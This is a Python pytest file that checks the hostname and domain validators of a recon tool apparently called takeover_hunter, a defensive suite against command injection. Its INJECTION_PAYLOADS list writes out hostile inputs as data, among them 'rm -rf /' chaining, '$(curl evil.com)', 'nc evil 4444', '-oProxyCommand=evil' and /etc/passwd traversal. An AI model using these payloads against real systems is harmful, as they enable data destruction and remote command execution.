"""Validation boundary tests — the security-critical unit suite.

These tests assert that the hostname/domain validators reject every shell
metacharacter and malformed input, which is what structurally prevents command
injection into the recon tool invocations.
"""
import pytest

from takeover_hunter.validation import (
    ValidationError,
    clean_hostnames,
    extract_hostname_from_url,
    is_valid_domain,
    is_valid_hostname,
    normalize_domain,
    normalize_hostname,
    require_domain,
    require_hostname,
)

# Payloads that must NEVER be accepted as a domain/hostname. Each carries a
# shell metacharacter or structural violation that would enable injection.
INJECTION_PAYLOADS = [
    "example.com;id",
    "example.com && rm -rf /",
    "example.com | nc evil 4444",
    "example.com`whoami`",
    "$(curl evil.com)",
    "example.com\nrm -rf /",
    "example.com > /etc/passwd",
    "example.com&sleep 10",
    "a.com'; DROP TABLE x;--",
    "ex ample.com",
    "example.com%0aid",
    "-oProxyCommand=evil",
    "../../../etc/passwd",
    "",
    "   ",
    "."*300,
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_normalize_domain_rejects_injection(payload):
    assert normalize_domain(payload) is None


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_normalize_hostname_rejects_injection(payload):
    assert normalize_hostname(payload) is None


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_require_domain_raises_on_injection(payload):
    with pytest.raises(ValidationError):
        require_domain(payload)


@pytest.mark.parametrize(
    "value,expected",
    [
        ("example.com", "example.com"),
        ("EXAMPLE.COM", "example.com"),
        ("  Example.Com  ", "example.com"),
        ("example.com.", "example.com"),
        ("https://example.com/path?q=1", "example.com"),
        ("http://example.com:8443/x", "example.com"),
        ("//example.com", "example.com"),
        ("user@example.com", "example.com"),
        ("sub.example.co.uk", "sub.example.co.uk"),
    ],
)
def test_normalize_domain_accepts_and_cleans(value, expected):
    assert normalize_domain(value) == expected


def test_hostname_allows_deep_subdomain():
    assert normalize_hostname("a.b.c.d.example.com") == "a.b.c.d.example.com"


def test_is_valid_domain_requires_tld():
    assert is_valid_domain("example.com")
    assert not is_valid_domain("localhost")
    assert not is_valid_domain("example")


def test_is_valid_hostname_allows_single_label():
    assert is_valid_hostname("localhost")
    assert not is_valid_hostname("bad host")


def test_label_length_limit_enforced():
    too_long_label = "a" * 64 + ".com"
    assert normalize_domain(too_long_label) is None


def test_total_length_limit_enforced():
    long_host = ".".join(["a"] * 130) + ".com"  # > 253 chars
    assert normalize_hostname(long_host) is None


def test_require_hostname_ok_and_error():
    assert require_hostname("api.example.com") == "api.example.com"
    with pytest.raises(ValidationError):
        require_hostname("no;good")


def test_clean_hostnames_dedupes_drops_invalid_and_limits():
    raw = [
        "api.example.com",
        "API.EXAMPLE.COM",       # dup after normalise
        "bad;host",              # dropped
        "https://cdn.example.com/x",  # normalised
        "another.example.com",
    ]
    out = clean_hostnames(raw, limit=10)
    assert out == ["api.example.com", "cdn.example.com", "another.example.com"]


def test_clean_hostnames_respects_limit():
    raw = [f"h{i}.example.com" for i in range(50)]
    assert len(clean_hostnames(raw, limit=5)) == 5


def test_clean_hostnames_empty_input():
    assert clean_hostnames([], limit=10) == []
    assert clean_hostnames(None, limit=10) == []


def test_extract_hostname_from_url():
    assert extract_hostname_from_url("https://a.example.com/app.js") == "a.example.com"
    assert extract_hostname_from_url("not a url ;rm") is None


def test_non_string_inputs_are_safe():
    for bad in (None, 123, {}, [], object()):
        assert normalize_domain(bad) is None
        assert normalize_hostname(bad) is None
